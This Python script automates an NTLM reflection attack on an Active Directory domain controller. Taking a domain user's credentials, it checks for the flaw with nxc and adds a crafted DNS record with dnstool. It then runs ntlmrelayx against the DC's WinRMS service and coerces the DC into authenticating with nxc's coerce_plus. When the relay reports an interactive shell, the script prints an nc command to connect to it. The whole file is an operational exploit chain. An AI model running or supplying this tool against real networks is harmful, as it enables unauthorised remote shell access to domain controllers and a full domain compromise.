#!/usr/bin/env python3

# Code for Automating NTLM_Reflection Attack
# Author : PaiN05
# 16-11-2025

import os
import argparse
import threading
import subprocess
import time
import signal

listener = "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
shell_detected = False

def run_process(cmd, process_name):
    """Run a process and monitor for shell string"""
    global shell_detected
    
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    print(f"[{process_name}] Started with PID: {process.pid}")

    for line in process.stdout:
        print(f"[{process_name}] {line}", end="", flush=True)
        
        # Check for WinRMS shell string
        if "Started interactive WinRMS shell via TCP on 127.0.0.1:11000" in line and not shell_detected:
            shell_detected = True
            print(f"\n" + "="*60)
            print(f"[!] SHELL READY! Run this command in a new terminal:")
            print(f"[!] nc 127.0.0.1 11000")
            print(f"[!] Both processes are still running in the background")
            print(f"="*60)
    
    return process

def main():
    global shell_detected
    
    parser = argparse.ArgumentParser(
        description="Automate NTLM relay workflow (DNS → DIG → Relay → Coerce)."
    )

    # DNS related details
    parser.add_argument("-u", required=True, help="Domain user (DOMAIN.LOCAL\\user)")
    parser.add_argument("-p", required=True, help="Password for the user")
    parser.add_argument("-d", required=True, help="Domain Name (e.g. paincorp.local)")
    parser.add_argument("-dc-name", required=True, help="DC hostname (e.g. dc01.paincorp.local)")
    parser.add_argument("-dc-ip", required=True, help="DC hostname (e.g. paincorp.local)")
    parser.add_argument("-ip", required=True, help="IP address the DNS record should point to")

    args = parser.parse_args()

    # PRINT parsed arguments
    print("[+] Parsed arguments:")
    for k, v in vars(args).items():
        print(f"    {k}: {v}")

    # Checking NTLM Reflection
    check_ntlm_reflection = (
        f"nxc smb {args.dc_name} "
        f"-u {args.u.split('\\')[-1]} -p '{args.p}' "
        f"-M ntlm_reflection"
    )
    #print(f"\n[+] NTLM_Reflection Exist:\n{dns_cmd}\n")

    # DNS add
    dns_cmd = (
        f"python3 /opt/krbrelayx/dnstool.py "
        f"-u '{args.d}\{args.u}' -p '{args.p}' "
        f"{args.dc_name} -a add -r '{listener}' "
        f"-d '{args.ip}' -dns-ip {args.dc_ip} --tcp --allow-multiple"
    )
    #print(f"\n[+] DNS Command:\n{dns_cmd}\n")

    # DIG check
    dig_cmd = (
        f"dig {listener}.{args.d} "
        f"@{args.dc_name} +tcp +short"
    )
    #print(f"[+] DIG Verification:\n{dig_cmd}\n")

    # Relay
    relay_cmd = (
        f"ntlmrelayx.py -smb2support -t 'winrms://{args.dc_name}'"
    )
    #print(f"[+] Relay Command:\n{relay_cmd}\n")

    # Coerce
    coerce_cmd = (
        f"nxc smb {args.dc_name} "
        f"-u {args.u.split('\\')[-1]} -p '{args.p}' "
        f"-M coerce_plus -o LISTENER={listener} ALWAYS=true"
    )
    #print(f"[+] Coerce Command:\n{coerce_cmd}\n")

    # ---------------------------------------------------------
    # EXECUTION PHASE - JUST MONITOR AND INFORM USER
    # ---------------------------------------------------------

    # Checking for NTLM Reflection using nxc
    print("\n NTLM Reflection Exists")
    os.system(check_ntlm_reflection)

    # Run DNS and DIG first
    print("\n[+] Running DNS setup...")
    os.system(dns_cmd)
    
    print("\n[+] Running DIG verification...")
    os.system(dig_cmd)

    # Start both processes
    print("\n[+] Starting ntlmrelayx and nxc coerce...")
    
    # Start relay in a thread
    relay_thread = threading.Thread(
        target=run_process, 
        args=(relay_cmd, "RELAY"), 
        daemon=True
    )
    relay_thread.start()

    # Wait a bit then start coerce
    time.sleep(3)
    
    # Start coerce in a thread
    coerce_thread = threading.Thread(
        target=run_process, 
        args=(coerce_cmd, "COERCE"), 
        daemon=True
    )
    coerce_thread.start()

    # Wait for shell detection or let processes run
    print("\n[+] Monitoring for shell... (Press Ctrl+C to stop all processes)")
    
    try:
        # Keep the main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n[!] Stopping all processes...")
        os.system("pkill -f 'ntlmrelayx' 2>/dev/null")
        os.system("pkill -f 'nxc smb' 2>/dev/null")
        print("[!] All processes stopped.")

if __name__ == "__main__":
    main()